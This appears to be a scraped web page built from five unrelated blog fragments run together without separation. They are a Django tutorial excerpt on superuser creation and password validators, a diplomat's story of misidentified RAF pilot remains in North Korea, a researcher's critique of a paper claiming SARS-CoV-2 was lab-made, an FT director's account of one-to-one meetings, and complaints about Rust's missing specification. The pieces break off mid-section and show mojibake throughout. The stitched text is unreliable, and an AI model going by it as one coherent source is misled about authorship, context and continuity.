</p><p>
Although the user created using this process will have no password. We can create the password either using the <code>changepassword</code> command or the admin panel.</p>
<h2 id="required-fields-and-interactive-mode">Required fields and interactive mode</h2><p>
For the default <code>User</code> model, <code>email</code> is the only required field but you can change that by changing your <code>REQUIRED_FIELD</code> setting as well.</p><p>
In the interactive mode( which is the default mode as well), the first thing that the prompt asks you to fill, is the username.</p><p>

Django tries to smartly suggest the current system username as the default username. (Just Wow)</p>
<p><img data-src="https://i.ibb.co/pr1Z1Qw/Screenshot-2020-09-19-at-2-14-46-AM.png" alt="django suggest the current system username" title="django suggest the current system username" src="https://i.ibb.co/pr1Z1Qw/Screenshot-2020-09-19-at-2-14-46-AM.png">
</p><p>
It wonâ€™t suggest the system username if it is already taken. (Thatâ€™s AI for me ðŸ˜‚)</p>
<p><img data-src="https://i.ibb.co/r3YxbKL/Screenshot-2020-09-19-at-2-15-41-AM.png" alt="django doens't suggest the current system username if already taken" title="django doens't suggest the current system username if already taken" src="https://i.ibb.co/r3YxbKL/Screenshot-2020-09-19-at-2-15-41-AM.png">
</p><p>
After the username, you have to fill in the required field which is the email field for the default User model.</p><p>
Finally, you have to fill in the password field.</p>
<h2 id="the-validate-password-method">The validate password method</h2><p>
Sorry for keeping you waiting this long before jumping onto the real reason behind the post.</p><p>
The <code>validatepassword</code> is the function that is used to validate the password provided by the user.</p><p>
Again, we can configure all these validators as well, if these different password validation doesnâ€™t work for you, go forward and remove the classes from your settings file.</p><p>
These are the default validators.</p>
<div><div><pre><code><span>AUTH_PASSWORD_VALIDATORS</span> <span>=</span> <span>[</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.MinimumLengthValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.CommonPasswordValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.NumericPasswordValidator'</span><span>,</span>
    <span>},</span>
<span>]</span>
</code></pre></div></div><p>
If we use the default validators, then the password,</p>
<ol>
<li>Should not be similar to <code>username</code>, <code>first_name</code>, <code>last_name</code> and <code>email</code>. It also checks for the similarity using <a href="https://docs.python.org/2.4/lib/sequence-matcher.html">SequenceMatcher</a>. It should be less than 0.7 similar which you can customize. (Told you, itâ€™s AI)</li>
<li>Should be greater than 8 characters.</li>
<li>Should not be in the list of common passwords. The list of common passwords is in the file, <code>common-passwords.txt.gz</code>. It contains a list of around 20000 common passwords which you should not use.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><strong>A cruel</strong> <strong>deception</strong> – <strong>RAF pilot</strong> <strong>remains</strong> discovered in <strong>North Korea</strong> is a story that once I had the full details of the aftermath several years later, quite frankly left me speechless and angry.</p><p>In early 2004, I was contacted at the embassy in Pyongyang by David Hinton, the brother of an RAF pilot who had been shot down in 1952 over North Korea during the Korean war. He said he had been working for several years trying to garner as much information from a variety of primary sources as to the fate of his brother.Â&nbsp; He said he now had in his possession most of the details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he later sent to me).</p><p>He then expressed a wish to be able to visit North Korea and hopefully, finally discover the fate of his brother. Could we help?</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/thumbnail-1/#main"><img width="400" height="311" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" alt="Flt Lt Hinton North Korea" aria-describedby="gallery-1-980" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?w=400&amp;ssl=1 400w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?resize=300%2C233&amp;ssl=1 300w" data-lazy-sizes="(max-width: 400px) 100vw, 400px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-980"> Flt Lt Hinton with USAF colleagues -Photo David Hinton</figcaption></figure></div><p>I knew that this was going to be a tall order to try and carry out. The Korean War itself was and still is a huge propaganda tool for the Kim dynasty. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><p>But surprisingly, no.</p><p>Permission was granted for me to meet with the North Korean military and at the initial meeting, I provided them with all the research material sent to me by David Hinton and they said they would investigate.</p><p><em><strong>The</strong><strong> process of making this project happen, working with the North Korean military, I have covered in a previous post</strong></em> <a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/">British Diplomat Works With North Korean Military </a></p><p>Against all expectations, the military did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. An exact location had been identified and human bones and fragments of uniform and aircraft had been uncovered. <em><strong>This scenario is somewhat similar to my previous post</strong> </em><a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p>With this discovery, events moved quickly. A visa for David to enter North Korea was fast tracked and he duly arrived hopeful for some form of final closure. During his visit, he was treated as an honoured guest by the North Koreans and enjoyed the rare distinction of being accompanied throughout his visit by a senior Korean People’s Army officer, Colonel Kwak Chol-hui, who was at that time Director of Negotiations for Remains at the armistice site at Panmunjom.</p><p>So, on the day appointed to visit the village to view the grave, we arrived early and were met by the Colonel and both witnesses who then led us to the gravesite which was a short distance away.</p><p>The grave consisted simply of a mound of earth surrounded by a white picket fence, without any inscription. It lay close to a narrow footpath on a hillside 200 meters from the road.</p><p>David was introduced at the grave to the two witnesses to Desmond’s crash, a Mr Ri and Mr Han, local villagers who were only 13-years old at the time of the incident but who still appeared to have perfect recollections of the event. Perhaps a little too perfect and too detailed I thought at the time. But, maybe it was just me being a tad too cynical.</p><p>David then gave a short speech at the grave, thanking Colonel Kwak and the British embassy for making his visit possible, while the head of the village promised to tend the grave and paint the fence regularly.</p><p>We spent about 2 hours in the village and at the gravesite before it was time to leave. We said farewell to the Colonel and the witnesses and set off back to Pyongyang and David left North Korea the next day.</p><p>Upon his return to the UK, he was kind enough to send me copies of the many photographs he had taken that day and which I still have.</p><p>I learnt later that in 2011, a casket containing the bones of Flt Lt Hinton had been passed with great ceremony to the then British ambassador to North Korea for repatriation and presumably for burial at the UN Korean War cemetery in Busan, South Korea.</p><p><strong>And here the story would have finally ended. But no!</strong></p><p>The British Daily Mail ran a story on 17th June 2018 that was a shocker to me. It was revealed that subsequent DNA testing carried out on the bones after the repatriation identified them not as those of Flt Lieutenant Hinton but those of an animal!</p><p>According to the paper, family members were informed but the media was kept in the dark for fear of damaging relations between North Korea and the UK. Don’t you just love political machinations!</p><p>The paper then went on to quote the source as the memoirs of Mr Thae Yong-Ho, a North Korean diplomat who was Deputy North Korean Ambassador to the UK at the time and who defected to South Korea in 2016.</p><p>It also came as North Korean dictator Kim Jong Un had agreed with US President Donald Trump at their Singapore summit that all remains of US servicemen who died in the Korean War would now be returned.</p><p>Interestingly, the New York Times ran a story on 1st August 2018 detailing how difficult it had been to identify remains of American MIA’s handed over by the North Koreans to the US as a result of the Agreement with the paper also quoting the Hinton DNA story.</p><p>Mr Thae maintained that the Hinton episode was a case of crass incompetence. He also stated that Britain did protest but North Korean officials countered by saying they lacked the proper equipment to distinguish human from animal bones.</p><p>To this day, I cannot believe how stupid the North Koreans behaved in this matter. They must have known that DNA would be carried out on the bones.Â&nbsp; If so, why did they release them?</p><p>A country that has a nuclear programme, the ability to launch missiles and a sophisticated scientific infrastructure coming out with such a lame excuse just didn’t hold water.</p><p>I might add that at the time of the Hinton project, Mr Thae was well known to the embassy in Pyongyang, both professionally and socially. He was an experienced diplomat at the Ministry of Foreign Affairs where as part of his portfolio, he was in charge of the UK desk, hence the contacts. So, he would have been well aware (and probably involved behind the scenes) in what developed.</p><p>So what should have been a positive North Korean story about the discovery and dignified burial of a fallen RAF pilot and the assistance given to a close relative to enable him to pay his last respects, in the end turned out to be nothing but a cruel and wicked deception.</p><p><em><strong>Sources:</strong></em></p><p>https://www.dailymail.co.uk/news/article-5852503/Remains-RAF-hero-shot-North-Korea-2011-turns-animal-bones.html</p><p>“Cryptography From the Third-<wbr>Floor Secretariatâ€� 2018 Thae Yong-Ho</p><div heateor-sss-data-href="https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/"><p>Spread the love</p><ul><li><a data-pin-lang="en_US" href="https://www.pinterest.com/pin/create/button/?url=https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/" data-pin-count="false" data-pin-do="buttonPin" data-pin-config="beside"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845" data-recalc-dims="1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845"></a></li></ul></div></div></div>]]>

<span> <img src="https://www.randombio.com/O40gray-gray.png" alt="O" title="O"></span>
n September 14 2020, Li-Meng Yan, a dissident Chinese virologist, along with three
colleagues, posted an article at <a href="https://zenodo.org/record/4028830">zenodo.org</a>
<sup>[1]</sup> claiming to prove that SARS-CoV-2 was artificially created. Twitter 
canceled the author's account two days later and political activists vociferously 
attacked the paper on political grounds. It is clear that many people don't want to 
hear her evidence. But the issue is extremely important. If the virus was produced 
in an experiment and accidentally released, as this paper claims, it means the Wuhan 
Institute of Virology is in dire need of upgrades to their virus-handling procedures 
to prevent it from happening again.
</p><p>
My background is 30 years as a researcher in protein biochemistry using biophysical 
techniques and molecular biology, including design, cloning, and expression of 
recombinant proteins, to study protein function and structure. Here's a brief
summary of the argument put forward in the paper along with my comments.
</p><p>
<i>Update, Sep 20 2020</i>: I've expanded the comments to describe the evidence they
would need to make their case more convincing.
</p><hr><p>
<b>Claim 1:</b> 
   “[the sequences of] RaTG13, RmYN02, and several pangolin viruses recently
   published are highly suspicious and likely fraudulent.”
   “The RaTG13 virus is excluded from this analysis given the strong evidence 
   suggesting that its sequence may have been fabricated and the virus does not exist 
   in nature.”
</p><p>
<b>Comment:</b>
   RaTG13 was published by Shi Zhengli at the same time as the SARS-CoV-2 sequence. 
   In 2013 Shi also published a partial gene segment of RaBtCoV/4991, which is identical 
   to RaTG13, but it is incomplete. The authors say that the WIV took this partial
   sequence and fraudulently added the remainder to exculpate themselves, trying
   to make it appear that RaTG13 was a pre-existing virus. 
</p><p>
   Evidence in favor of this claim is that Shi <i>et al.</i> made no mention of 
   RaBtCoV/4991 in their 2020 paper. But unless someone wants to claim that 4991 
   was also fabricated, RaBtCoV/4991 had to come from somewhere, which is to say it is 
   a real virus. So Claim 1 doesn't make sense. 
</p><p>
<b>What is needed:</b>
   To prove this the authors would have to find another virus that is 100% identical 
   with the published partial RaBtCoV/4991 sequence but which differs from RaTG13. 
</p><hr><p>

<b>Claim 2:</b> 
   The WIV could have used transgenic hACE2 transgenic mice to improve the virus's
   ability to bind to its receptor. “This animal model 
   has been established during the study of SARS-CoV and has been available in the 
   Jackson Laboratory [a commercial supplier of transgenic mice] for many years.”
   However, hACE2 mice are “not a good model to reflect the virus' transmissibility
   and associated clinical symptoms in humans.” If they had used golden Syrian
   hamster instead, the authors say, “the highly contagious nature of SARS-CoV-2 
   would be extremely evident” and they could have released accurate information.
</p><p>
<b>Comment:</b> 
   This is a good point. If true, it would tend to exculpate the Chinese researchers.
   But we already know many techniques they could have used. No one was claiming 
   that making the virus was impossible. 
</p><p>
<b>What is needed:</b> 
   Sending live animals to another country requires tons of paperwork. They would need
   Jax's sales records or government export records (which might be available via a
   FOIA request). 
</p><hr><p>
<b>Claim 3:</b> 
   The paper provides a flow chart for how the virus could have been constructed.
   “Two restriction sites are present at either end of the RBM [receptor-binding
   motif] of SARS-CoV-2, providing convenience for replacing the RBM within the spike 
   gene.”
</p><p>
<b>Comment:</b> 
   The spike protein consists of two parts: S1, which binds to the receptor, and S2,
   which fuses the viral and cellular membranes. The point where the subunits are joined 
   is called the S1/S2 site. Proteolysis of this site is essential for infection.
   The RBM is the part of S1 that binds to the receptor. A common technique is 
   to take functional domains out of one protein and put them into another. The easiest 
   way to do this is by finding (or creating) restriction sites in the DNA that allow 
   you to cut the DNA in a specific place.
</p><p>
   The flow chart is quite reasonable, but again no one doubted that artificially 
   creating the virus is possible. So describing how someone could have done it
   doesn't tell us much; any competent molecular biologist could come up with
   a similar scheme.
</p><p>
   The article makes a big deal about the presence of restriction sites on the S1/S2 
   sequence, including an <code>EcoRI</code> site and a <code>BstEII</code> site. 
   But this does not indicate engineering. Many restriction sites occur naturally by 
   chance. Their presence is not unusual, but they are a major inconvenience for those 
   of us who try to clone DNA—many restriction sites we might wish to use are 
   ruled out by the presence of another one in an inconvenient location. The 
   probability of finding one of over a thousand known 
   <a href="http://rebase.neb.com/rebase/rebase.html">restriction sites</a> at an 
   arbitrary location in a 3800 base sequence by chance is very high.
</p><p>
<b>What is needed:</b> 
   To prove this convincingly, the authors would need to find an authentic copy 
   of the original virus sequence without the restriction sites to show what the virus 
   was like before the supposed change was made. 
</p><hr><p>
<b>Claim 4:</b> 
   The furin cleavage site contains rare codons, an unusual sequence not shared by other 
   lineage B betacoronaviruses, and a <code>FauI</code> restriction site. It 
   could not have been introduced by evolution, say the authors, and the probability 
   of successful homologous recombination ever occurring among the ancestors of these 
   viruses is low. “A  <code>FauI</code> restriction site is formulated by the codon choices 
   here, suggesting the possibility that the restriction fragment length polymorphism,
   a technique that a WIV lab is proficient at, could have been involved.”
   The authors suggest that the <code>FauI</code> site was added to monitor the presence
   of the furin-cleavage site.
</p><p>
<b>Comment:</b> 
   The furin cleavage site is known to increase the tropism of the virus, and it is 
   now known that the virus even infects the brain, but there is little evidence so
   far that it increases pathogenicity. There is as yet no good explanation for the 
   presence of the furin cleavage site. 
</p><p>
   It might make sense for a virus creator to put a restriction site in the middle of
   the furin cleavage site to make sure it didn't disappear. RFLP analysis is a simple 
   technique and any molecular biology lab could handle it easily. However, as mentioned,
   restriction sites pop up randomly all the time, so finding one proves little.
</p><p>
<b>What is needed:</b> 
   The <code>FauI</code> restriction site is a red herring. To prove that the furin cleavage
   site was added, the authors would have to find a trail of evidence showing step
   by step how the sequence was manipulated from whatever virus the WIV started from.
   It would also be helpful to have data showing that furin cleavage increases 
   pathogenicity. This is plausible but it needs to be shown experimentally.
</p><hr><p>
<b>Claim 5:</b> 
   WIV most likely used ZC45 and ZXC21, not RaTG13, to create SARS-CoV-2 because RaTG13 is 
   not real. The reasoning behind this claim is that the S1 sequence of SARS-CoV-2 
   is quite similar to these other viruses except for the receptor-binding motif and 
   furin-cleavage sites. Also, two other proteins on these viruses, the Orf8 protein 
   and E protein, are 94.2% and 100% identical to SARS-CoV-2.
</p><p>
<b>Comment:</b> 
   This is indeed strange but so far circumstantial.
</p><p>
<b>What is needed:</b> 
   The authors need to prove that RaTG13 is not real. They claim to have evidence,
   and I look forward to seeing it,  but to be convincing it would have to be more 
   than the discovery of mysterious unexplained features in the DNA sequence.
</p><hr><p>
The authors say they plan to prove that RaTG13 is fabricated in a follow-up report. 
If they can do this, it would be solid evidence of consciousness of guilt on the part 
of WIV researchers. However, the current paper doesn't say very much more than what 
other bloggers have already revealed.
</p><p>
It would be premature to draw any conclusion about the origins of the virus from this
paper. The authors have set for themselves a difficult and possibly impossible task: 
finding a signature of intel­ligent design in a virus is much like what the 
creationists have been doing without success for years. 
</p><p>
But what is not premature is that social media giants deciding for us what is 
true and what is false may turn out to be as big a threat as the virus. It is unfair 
and unscientific to dismiss ideas that one doesn't want to hear as “conspiracy 
theories” as many people are doing.

    <date>17 September 2020</date>
      <p>When I joined the Financial Times as Technical Director for FT.com, I inherited a team of around 50 engineers. One of the first things I did was meet each of them for a one-to-one. I was initially resistant, but it was extremely valuable, I’m glad I did it, and I would definitely do it again in a future role.</p>

<h2 id="my-mentors-advice-about-the-content-of-the-meeting">My mentor’s advice about the content of the meeting</h2>

<p>The idea was suggested to me by a mentor, who’d been advised to do it by <em>his</em> mentor, a Rear Admiral, who said this was something you should do whenever you have a team of fewer than 150 people. My mentor gave me some tips:</p>

<ul>
  <li>Be clear about whether you will take action or whether this is for information only.</li>
  <li>This should mostly be about listening – you should talk for maybe 5 minutes and they should talk for 25.</li>
  <li>It’s to find out what’s going well and what’s not going well.</li>
  <li>It’s informal, but make sure it’s in an enclosed meeting room so that people feel they can speak freely.</li>
  <li>Sometimes it will be quite boring, sometimes you may just learn a lot about someone’s family or hobbies, but that is useful from a getting to know people/relationship-building perspective and it means that you know some things about that person.</li>
  <li>Aim is to get a bit about their background, their priorities and their pressures.</li>
</ul>

<h2 id="making-time-was-hard">Making time was hard</h2>

<p>I was initially resistant because of the time commmitment. With a team of ~50, that’s a lot of hours, and I was also working four days a week so each meeting takes up a greater proportion of time. However, once I’d made the decision to do this and announced my intention, it was important to me to follow through, so I made sure to make time.</p>

<p>I scheduled four of these 1:1s a week, starting with the people reporting directly to me and then on down the management chain.</p>

<h2 id="i-ran-each-meeting-in-the-same-way">I ran each meeting in the same way</h2>

<p>Firstly I ran through everything I planned to cover, and then stepped through it.</p>


<ul>
  <li>I am asking the same questions to everyone</li>
  <li>This is information for me only to get an idea of themes and how things are going; I’m not explicitly planning to take action on anything we discuss, so if something comes up that I need to take action on, let’s make sure we discuss that after this meeting</li>
  <li>This is confidential. If you say something about someone else I’m not going to go and tell them. I may report on ‘what people are saying’, but I’ll say ‘the engineers feel’ or ‘an engineer said’; I won’t say “[Your name] said…”</li>
</ul>

<h3 id="what-were-going-to-discuss">What we’re going to discuss</h3>

<ul>
  <li>First I’ll introduce myself, and tell you a bit about my background</li>
  <li>Then, if you like, I’d love you to tell me a bit about yourself – as much or as little as you feel like sharing</li>
  <li>Then we’ll discuss the following questions:</li>
</ul>

<ol>
  <li>What do you think the most important things we should be doing over the next year?</li>
  <li>What will get in the way of us doing that?</li>
  <li>What’s going well, i.e. what should we make sure we don’t change?</li>
  <li>Is there anything you think I should know about?</li>
</ol>

<h2 id="is-there-anything-i-should-know-about">Is there anything I should know about?</h2>

<p>When I asked this question I talked a bit about why I was asking. I explained that I might not necessarily see or know things that may seem apparent to them, and while they should always feel able to bring things to me, now was a good opportunity to do so. It was an opportunity to make sure I’ve heard what’s important to you, what things should change and what things should stay the same.</p>

<p>This question always elicited very interesting responses, from organisational issues, to personal information people felt it was valuable for me to know about them.</p>

<h2 id="i-told-them-what-i-was-planning-to-ask-in-advance">I told them what I was planning to ask in advance</h2>

<p>I put all the information in the meeting invite.</p>

<div>
<p>I mentioned that I wanted to have a chat with everyone on FT.com to understand how things are going, does this time suit you for this?</p>

<p>The meeting agenda is the same for everyone; a quick intro and then the following questions (I'll go through this in the meeting too):</p>

<ul>
<li>What do you think the most important things we should be doing over the next year?</li>
<li>What will get in the way of us doing that?</li>
<li>What’s going well, i.e. what should we make sure we don’t change?</li>

<p>Some people did not read the meeting invite and came with no idea what the meeting was about. Some people had fully prepared and written notes that they then read out to me. Actually people having prepared sometimes was less useful, because sometimes it led the conversation to solutions rather than problems. However it was great that people had really given it some thought.</p>

<h2 id="making-notes-felt-too-much-like-a-promise">Making notes felt too much like a promise</h2>

<p>Each meeting was half an hour. In the very first one, I made notes in a notebook, but I realised that created an implicit commitment that I was going to take action on everything that was said, even though I had said it was information only.</p>

<p>However, I do not have a very good memory, so for all the subsequent ones I made a few notes after each meeting of key themes. This meant I couldn’t do more than two in a row or go straight into another meeting, so it made scheduling slightly harder. These days, people are much more aware of the shorter meeting approach so if doing this again, I’d go for the ‘therapy hour’ – 25 minutes for conversation then 5 minutes for me to make the notes.</p>

<h2 id="introducing-myself">Introducing myself</h2>

<p>In my intro, I gave a potted career history. Starting from my degree in philosophy, and my first career in <a href="https://www.barringtonstoke.co.uk/">children’s book publishing</a>, through teaching myself to code, my <a href="https://www.hw.ac.uk/study/uk/postgraduate/information-technology-software-systems.htm">masters in Software Systems</a> and then my 15+ year career in programming, infrastructure and operations, technical architecture, and my previous role as <a href="https://www.annashipman.co.uk/jfdi/a-year-in-the-life-os-lead.html">Open Source lead</a>. I also talked about what appealed to me about the job as Technical Director at the FT.</p>

<p>I said roughly the same thing to everyone. I don’t normally introduce myself and give my background, but in this case I thought that as a new Tech Director most of them would not be working closely with me, and I would not be contributing code, so it was worth giving my credentials.</p>

<p>My mentor had suggested I also say something personal. I think he intended something like “married with two children” (or whatever), but instead, I tried to give a different kind of personal detail, something about my interests. I tried to come up with a different one for each conversation, for example something about my <a href="https://twitter.com/annashipman/status/1043917006477643777">cross-stitch hobby</a>.</p>

<p>This part was the hardest part for me, because prior to this I had generally enjoyed keeping a clear boundary between work stuff and personal stuff, so that definitely didn’t cover talking about cross-stitch, or my home life, on a first meeting. However, I had been trying to bring more of my personal self to work, and this part of the intro did lead to some really interesting conversations and I think helped make a better connection.</p>

<p>Of course, these days, when we are all at home, my personal life is in meetings with me, so it’s good I’d already started on that journey!</p>

<p>Giving so much information in my introduction also allowed the other person to introduce themselves how they wanted. Some talked career history, some focused on their hobbies, others were really open about their lives and aspirations.</p>

<h2 id="i-am-so-glad-i-did-this">I am so glad I did this</h2>

<p>My mentor was wrong about one thing –&nbsp;none of the conversations were boring.</p>

<p>In my first few months in the new job, I often felt really stretched for time, but I never regretted a single one of these meetings; it was always extremely interesting, my team are brilliant and it was great to meet them one on one, and each conversation always contained some valuable information.</p>

<p>There were two very valuable things about this for me.</p>

<p>The first was getting an idea of what change was needed. These meetings gave me a brilliant insight that wasn’t available elsewhere. Patterns started emerging very quickly, and formed the basis of our <a href="https://medium.com/ft-product-technology/the-difficult-teenage-years-setting-tech-strategy-after-a-launch-7f42eb94a424">tech strategy</a>.</p>

<p>The second was building relationships. A lot of the people I had 1:1s with I would not have come into contact with during the course of the ordinary working week. It would have taken time to meet everyone at socials, and it wouldn’t have been the same quality of conversation. I still feel, two years on, that I know a bit about all the people I had those conversations with, which has felt to me like a good foundation for our subsequent conversations.</p>

<p>It was also good, as someone who is a bit shy, to have names to faces quite quickly and people to say hello to when walking round the office.</p>

<h2 id="was-it-useful-for-my-team">Was it useful for my team?</h2>

<p>About a year later, I asked some of the people with whom I’d had these conversations whether they’d been useful (in an anonymous form).</p>

<p>All of the people who responded said they found the conversation valuable, and some of their comments were:</p>

<ul>
  <li>“It broke down barriers and helped me feel less intimidated about approaching you, whether to talk about work or just to have a general chit chat. You are a very busy person who I wouldn’t ever work with directly so it was good to feel that you knew I existed.”</li>
  <li>“There is hardly any opportunity for me to talk to people in higher position like you except when the team has a big problem. The 1:1 was really casual and I felt really comfortable talking to you. It was a good time to know what kind of person you are. If we didn’t do the 1:1, the answer of the question below “Do you feel able to raise issues with me?” would be “No”.”</li>
  <li>“We sat down when you first started and it was nice to get some one-to-one time because it’s not often you get to do that with a Technical Director. It was nice to raise issues but for me, it was more of an opportunity to understand if I could trust you in the future with raising issues. Raising issues can be difficult and scary so it’s important to know if the person you are raising them to is receptive.”</li>
  <li>“It really showed that you cared about us as humans, and how we fit with the rest of the team. It was also a great opportunity to get to know you”</li>
  <li>“I think often of that conversation”</li>
</ul>

				<p>While I have nothing against Rust as such and keep writing my pet project in Rust, there are still some deficiencies I find preventing Rust from being a proper programming language. Here I’d like to present them and explain why I deem them as such even if not all of them have any impact on me.<br>
<span id="more-1971"></span></p>
<h3>Rust language problems</h3>
<p>First and foremost, <strong>Rust does not have a formal language specification</strong> and by that I mean that while some bits like grammar and objects are explained, there are no formal rules to describe what language features can and cannot be. If you’ve ever looked at ISO C standard you’ve seen that almost any entity there has three or four parts in the description: formal syntax, constraints (i.e. what is not allowed or what can’t be done with it), semantics (i.e. what it does, how it impacts the program, what implementation caveats are there), and there may be some examples to illustrate the points. The best close equivalent in Rust is <a href="https://doc.rust-lang.org/reference/" rel="noopener noreferrer" target="_blank">The Rust Reference</a> and e.g. structure there is described in the following way: syntax (no objections there), definition in a form of “A struct is a nominal struct type defined with the keyword <code>struct</code>.”, examples, a brief mention of empty (or unit-like) structures in the middle of examples, and “The precise memory layout of a struct is not specified.” at the end. I understand that adding new features is more important than documenting them but this is lame.</p>
<p>A proper mature language (with 1.0 in its version) should have a formal specification that should be useful both for people developing compilers and the programmers trying to understand certain intricacies of the language and why it does not work as expected (more on that later). For example, for that <code>struct</code> definition I find lacking at least these: mentioning that you can have <code>impl</code> for it (even a reference would do—even if you have to repeat it for every type), split off tuples into a separate entry because it’s very different syntactically and raises a question why you have anonymous tuples and not anonymous structs (which you also can’t find from the documentation), and of course create proper layout so that rather important information (about memory layout for example) is not lost among examples.</p>
<p>And now to the specific problems I encounter quite often and I don’t know whether I understand it wrong or the compiler understands it wrong. And since there’s no formal specification I can’t tell which one it is (even if the former is most probable).</p>
<p><strong>Function/method calling convention.</strong> Here’s a simple example:</p>
<blockquote><p>
struct Foo { a: i32 }<br>
impl Foo { fn bar(&amp;mut self, val: i32) { self.a = val + 42; } }<br>
fn main() {<br>
&nbsp; let mut foo = Foo { a: 0 };<br>
&nbsp; foo.bar(foo.a);<br>
}
</p></blockquote>
<p>For now this won’t compile because of the borrowing but shouldn’t the compiler be smart enough to create a copy of <code>foo.a</code> before call? I’m not sure but IIRC current implementation first mutably borrows object for the call and only then tries to borrow the arguments. Is it really so and if yes, why? <em>Update:</em> I’m told that newer versions of the compiler handle it just fine but the question still stands (was it just a compiler problem or the call definition has been changed?).</p>
<p>The other thing is the old C caveat of function arguments evaluation. Here’s a simple example:</p>
<blockquote><p>
let mut iter = “abc”.chars();<br>
foo(iter.next().unwrap(), iter.next().unwrap(), iter.next().unwrap());
</p></blockquote>
<p>So would it be <code>foo('a','b','c')</code> or <code>foo('c','b','a')</code> call. In C it’s undefined because it depends on how arguments are passed on the current platform (consider yourself lucky if you don’t remember <code>__pascal</code> or <code>__stdcall</code>). In Rust it’s undefined because there’s no formal specification to tell you even that much. And it would be even worse if you consider that you may use the same source for indexing the caller object like <code>handler[iter.next().unwrap() as usize].process(iter.next().unwrap());</code> in some theoretical bytecode handler (of course it’s a horrible way to write code and you should use named temporary variables but it should illustrate the problem).</p>
<p>And another source of annoyance for me is <strong>traits</strong>. I have almost no problems with owning/lifetime/borrowing concepts but traits get me almost every time. I’m vaguely aware that the answer to why the following problems exist is “because traits are implemented as a call table” but again, <em>should</em> they be implemented like that and what should be the constraints on them (after all the original object should be somehow linked to the trait pointer). So when you have a supertrait (i.e. <code>trait Foo: Bar</code>) you can’t easily cast it for subtrait (e.g. <code>&amp;Foo -&gt; &amp;Bar</code>) without writing a lot of boilerplate code. And even worse if you convert an object into <code>Box&lt;trait&gt;</code> there’s no way to get the original object back (still in boxed form of course; I remember seeing a special crate that implements a lot of boilerplate code in order to get a mutable reference though). To reiterate: the problem is not me being stupid but rather the lack of formal description on how it’s done and why what I want is so hard. Then I’d probably at least be able to realize how I should change my code to work around the limitations.</p>
<h3><code>rustc</code> problems</h3>
<p>No, I’m not going to talk about compilation speed. It’s certainly a nuisance but not a problem per se. Here I want to point rather theoretical problems that a mature language should not have. And having just one compiler is one of those problems (call that problem zero).</p>
<p>First of all, <strong>bootstrapping process</strong> is laughably bad. I realize that it’s never too easy but if you call yourself a systems programming language you should be able to bootstrap a compiler in a sane amount of steps. For instance, IIRC <code>Guix</code> has the following bootstrapping process for C compiler: simple C complier in Scheme (for which you can often write an implementation in assembly by hand) compiles TCC, TCC compiles GCC 2.95, GCC 2.95 compiles GCC 3.7, GCC 3.7 compiles GCC 4.9. For <code>rustc</code> you should either start with the original compiler written in OCaml and compile every following version with the previous one (i.e. 1.17 with 1.16) or cheat by using <code>mrustc</code> written in C++ which can compile Rust 1.19 or 1.29 (without borrow checks), then compile 1.30 with 1.29, 1.31 with 1.30 etc etc. The problem here is that you cannot skip versions and e.g. compile <code>rustc 1.46</code> with <code>rustc 1.36</code> (I’d be happy to learn that I’m wrong). IMO you should have maybe an ineffective compiler but written in a dialect that much older compiler should understand i.e. <code>rustc 1.0</code> should be able to compile a compiler for 1.10, which can be used to compile 1.20 and so forth. Of course it’s a huge waste of resources for rather theoretical problem but it may prove beneficial for compiler design itself.</p>
